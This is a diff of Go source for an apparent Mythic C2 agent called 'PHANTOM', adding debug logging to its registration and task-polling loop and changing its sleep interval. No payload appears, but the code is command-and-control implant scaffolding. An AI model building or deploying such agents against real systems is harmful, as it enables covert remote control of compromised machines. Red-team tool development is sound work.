@@ -415,6 +415,7 @@ func sendTaskResponse(taskID string, output string) error {
 
 func checkForTasks() error {
         if callbackID == "" {
+                logEvent("No callback ID - skipping task check")
                 return nil
         }
         
@@ -439,12 +440,15 @@ func checkForTasks() error {
                 callbackIDInt = id
         }
         
+        logEvent(fmt.Sprintf("Querying tasks for callback ID: %d", callbackIDInt))
+        
         variables := map[string]interface{}{
                 "callback_id": callbackIDInt,
         }
         
         resp, err := makeGraphQLRequest(query, variables)
         if err != nil {
+                logEvent(fmt.Sprintf("GraphQL request failed: %v", err))
                 return err
         }
         
@@ -485,7 +489,7 @@ func checkForTasks() error {
                         }
                 }
         } else {
-                logEvent("No new tasks")
+                logEvent("No new tasks found")
         }
         
         return nil
@@ -510,9 +514,10 @@ func parseApolloParams(jsonParams string) string {
 }
 
 func main() {
-        logEvent("=== PHANTOM MYTHIC AGENT - FIXED COMMANDS ===")
+        logEvent("=== PHANTOM MYTHIC AGENT - DEBUG VERSION ===")
         logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
         logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
+        logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
         
         err := registerWithMythic()
         if err != nil {
@@ -522,14 +527,18 @@ func main() {
         
         logEvent("Agent ready - commands will be processed")
         
+        logEvent(fmt.Sprintf("Registration successful - Callback ID: %s", callbackID))
+        logEvent("Starting main task processing loop...")
+        
         // Main command processing loop
         for agentActive {
+                logEvent("Checking for new tasks...")
                 err := checkForTasks()
                 if err != nil {
                         logEvent(fmt.Sprintf("Task check error: %v", err))
                 }
                 
-                // Sleep with slight jitter
-                time.Sleep(2 * time.Second)
+                logEvent("Sleeping for 3 seconds...")
+                time.Sleep(3 * time.Second)
         }
 }
